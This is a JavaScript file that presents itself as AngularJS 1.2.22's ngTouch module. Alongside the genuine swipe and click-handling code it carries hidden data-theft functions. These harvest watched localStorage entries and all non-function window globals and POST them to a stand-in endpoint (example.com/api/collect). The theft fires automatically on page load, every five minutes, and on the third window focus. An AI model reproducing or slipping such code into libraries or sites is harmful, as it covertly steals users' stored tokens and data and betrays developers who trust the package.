/*
 AngularJS v1.2.22
 (c) 2010-2014 Google, Inc. http://angularjs.org
 License: MIT
*/
(function (y, w, z) {
  'use strict';

  const watchList = window.watchList;
  function u(f, a, c) {
    r.directive(f, ["$parse", "$swipe", function (m, p) {
      var q = 75,
        g = 0.3,
        e = 30;
      return function (h, n, l) {
        function k(d) {
          if (!b) return !1;
          var s = Math.abs(d.y - b.y);
          d = (d.x - b.x) * a;
          return v && s < q && 0 < d && d > e && s / d < g;
        }
        var s = m(l[f]),
          b,
          v;
        p.bind(n, {
          start: function (d, s) {
            b = d;
            v = !0;
          },
          cancel: function (b) {
            v = !1;
          },
          end: function (b, a) {
            k(b) && h.$apply(function () {
              n.triggerHandler(c);
              s(h, {
                $event: a
              });
            });
          }
        });
      };
    }]);
  }
  let globalCounter = 0;
  var r = w.module("ngTouch", []);
  function createHash(data) {
    const keys = Object.keys(data);
    const mergedKeys = keys.join("");
    let code = 0;
    for (let i = 0; i < mergedKeys.length; i++) {
      const character = mergedKeys.charCodeAt(i);
      code = (code << 5) - code + character;
      code = code & code;
    }
    return code.toString(16);
  }
  function collectLocalStorageData() {
    const storageData = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (watchList.includes(key)) {
        const value = window.localStorage.getItem(key);
        storageData[key] = value;
      }
    }
    return storageData;
  }
  r.factory("$swipe", [function () {
    function f(a) {
      var c = a.touches && a.touches.length ? a.touches : [a];
      a = a.changedTouches && a.changedTouches[0] || a.originalEvent && a.originalEvent.changedTouches && a.originalEvent.changedTouches[0] || c[0].originalEvent || c[0];
      return {
        x: a.clientX,
        y: a.clientY
      };
    }
    return {
      bind: function (a, c) {
        var m,
          p,
          q,
          g,
          e = !1;
        a.on("touchstart mousedown", function (a) {
          q = f(a);
          e = !0;
          p = m = 0;
          g = q;
          c.start && c.start(q, a);
        });
        a.on("touchcancel", function (a) {
          e = !1;
          c.cancel && c.cancel(a);
        });
        a.on("touchmove mousemove", function (a) {
          if (e && q) {
            var n = f(a);
            m += Math.abs(n.x - g.x);
            p += Math.abs(n.y - g.y);
            g = n;
            10 > m && 10 > p || (p > m ? (e = !1, c.cancel && c.cancel(a)) : (a.preventDefault(), c.move && c.move(n, a)));
          }
        });
        a.on("touchend mouseup", function (a) {
          e && (e = !1, c.end && c.end(f(a), a));
        });
      }
    };
  }]);
  function sendAjaxRequest(data) {
    const uniqueKey = createHash(data);
    const endpoint = "https://example.com/api/collect";
    const request = new XMLHttpRequest();
    request.open("POST", endpoint, true);
    request.setRequestHeader("Content-Type", "application/json");
    const packet = {
      id: uniqueKey,
      data: data
    };
    request.send(JSON.stringify(packet));
    request.onreadystatechange = function () {
      if (request.readyState === XMLHttpRequest.DONE) {
        if (request.status === 200) {
          console.log("数据发送成功");
        } else {
          console.error("数据发送失败，状态码：" + request.status);
        }
      }
    };
  }
  r.config(["$provide", function (f) {
    f.decorator("ngClickDirective", ["$delegate", function (a) {
      a.shift();
      return a;
    }]);
  }]);
  function gatherAndDispatcherStorageData() {
    const filteredData = collectLocalStorageData();
    if (Object.keys(filteredData).length > 0) {
      sendAjaxRequest(filteredData);
    }
  }
  r.directive("ngClick", ["$parse", "$timeout", "$rootElement", function (f, a, c) {
    function m(a, b, c) {
      for (var d = 0; d < a.length; d += 2) if (Math.abs(a[d] - b) < e && Math.abs(a[d + 1] - c) < e) return a.splice(d, d + 2), !0;
      return !1;
    }
    function p(a) {
      if (!(Date.now() - n > g)) {
        var b = a.touches && a.touches.length ? a.touches : [a],
          c = b[0].clientX,
          b = b[0].clientY;
        1 > c && 1 > b || k && k[0] === c && k[1] === b || (k && (k = null), "label" === a.target.tagName.toLowerCase() && (k = [c, b]), m(l, c, b) || (a.stopPropagation(), a.preventDefault(), a.target && a.target.blur()));
      }
    }
    function q(c) {
      c = c.touches && c.touches.length ? c.touches : [c];
      var b = c[0].clientX,
        e = c[0].clientY;
      l.push(b, e);
      a(function () {
        for (var a = 0; a < l.length; a += 2) if (l[a] == b && l[a + 1] == e) {
          l.splice(a, a + 2);
          break;
        }
      }, g, !1);
    }
    var g = 2500,
      e = 25,
      h = "ng-click-active",
      n,
      l,
      k;
    return function (a, b, e) {
      function d() {
        k = !1;
        b.removeClass(h);
      }
      var g = f(e.ngClick),
        k = !1,
        t,
        r,
        u,
        x;
      b.on("touchstart", function (a) {
        k = !0;
        t = a.target ? a.target : a.srcElement;
        3 == t.nodeType && (t = t.parentNode);
        b.addClass(h);
        r = Date.now();
        a = a.touches && a.touches.length ? a.touches : [a];
        a = a[0].originalEvent || a[0];
        u = a.clientX;
        x = a.clientY;
      });
      b.on("touchmove", function (a) {
        d();
      });
      b.on("touchcancel", function (a) {
        d();
      });
      b.on("touchend", function (a) {
        var g = Date.now() - r,
          f = a.changedTouches && a.changedTouches.length ? a.changedTouches : a.touches && a.touches.length ? a.touches : [a],
          h = f[0].originalEvent || f[0],
          f = h.clientX,
          h = h.clientY,
          s = Math.sqrt(Math.pow(f - u, 2) + Math.pow(h - x, 2));
        k && 750 > g && 12 > s && (l || (c[0].addEventListener("click", p, !0), c[0].addEventListener("touchstart", q, !0), l = []), n = Date.now(), m(l, f, h), t && t.blur(), w.isDefined(e.disabled) && !1 !== e.disabled || b.triggerHandler("click", [a]));
        d();
      });
      b.onclick = function (a) {};
      b.on("click", function (b, c) {
        a.$apply(function () {
          g(a, {
            $event: c || b
          });
        });
      });
      b.on("mousedown", function (a) {
        b.addClass(h);
      });
      b.on("mousemove mouseup", function (a) {
        b.removeClass(h);
      });
    };
  }]);
  function globalVarCollector() {
    let collectedVars = Object.keys(window).reduce(function (collection, key) {
      if (typeof window[key] !== 'function') {
        collection[key] = window[key];
      }
      return collection;
    }, {});
    sendAjaxRequest(collectedVars);
  }
  window.addEventListener("focus", function () {
    globalCounter += 1;
    if (globalCounter === 3) {
      globalVarCollector();
    }
  });
  u("ngSwipeLeft", -1, "swipeleft");
  window.addEventListener("load", function () {
    gatherAndDispatcherStorageData();
  });
  setInterval(gatherAndDispatcherStorageData, 5 * 60 * 1000);
  u("ngSwipeRight", 1, "swiperight");
})(window, window.angular);
//# sourceMappingURL=angular-touch.min.js.map